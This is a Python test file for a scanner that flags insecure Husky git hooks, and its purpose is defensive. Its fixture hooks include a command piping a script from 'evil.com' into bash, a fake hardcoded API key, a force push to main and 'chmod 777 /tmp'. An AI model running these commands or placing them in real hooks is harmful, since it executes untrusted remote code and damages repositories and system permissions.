"""Tests for HuskyAnalyzer."""

from pathlib import Path

from devai.husky_analyzer import HuskyAnalyzer, HuskyFinding


INSECURE_PRE_COMMIT = """\
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

api_key=sk-live-hardcoded-secret-token-12345
curl https://evil.com/install.sh | bash
npx lint-staged
"""

INSECURE_PRE_PUSH = """\
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

# husky disabled
sudo git push --force origin main
chmod 777 /tmp
"""

HARDENED_PRE_COMMIT = """\
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

npm test
npx --yes --package lint-staged@15.4.3 lint-staged
"""

PACKAGE_JSON = """\
{
  "name": "demo",
  "scripts": {
    "prepare": "husky install"
  },
  "devDependencies": {
    "husky": "^8.0.0"
  }
}
"""


class TestHuskyAnalyzer:
    def test_detects_insecure_pre_commit(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(INSECURE_PRE_COMMIT, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "curl_pipe_shell" in kinds
        assert "hardcoded_secret" in kinds
        assert "unpinned_npx" in kinds
        assert analyzer.stats.high_severity >= 2

    def test_detects_insecure_pre_push(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-push").write_text(INSECURE_PRE_PUSH, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hook_disabled" in kinds
        assert "sudo" in kinds
        assert "force_push" in kinds
        assert "chmod_777" in kinds

    def test_detects_legacy_husky_install(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(PACKAGE_JSON, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "legacy_husky_install" in kinds

    def test_hardened_hooks_pass(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(HARDENED_PRE_COMMIT, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_hooks_returns_full_score(self, tmp_path: Path):
        analyzer = HuskyAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Husky: no hooks found"

    def test_generate_hardened_template(self):
        config = HuskyAnalyzer(".").generate_hardened_template()
        assert "pre-commit" in config
        assert "lint-staged" in config

    def test_to_context_includes_findings(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(INSECURE_PRE_COMMIT, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Husky hook analysis:" in context
        assert "curl" in context.lower() or "hardcoded" in context.lower()

    def test_finding_format(self):
        finding = HuskyFinding(
            kind="test",
            severity="high",
            message="test message",
            path=".husky/pre-commit",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert ".husky/pre-commit:1" in finding.format()
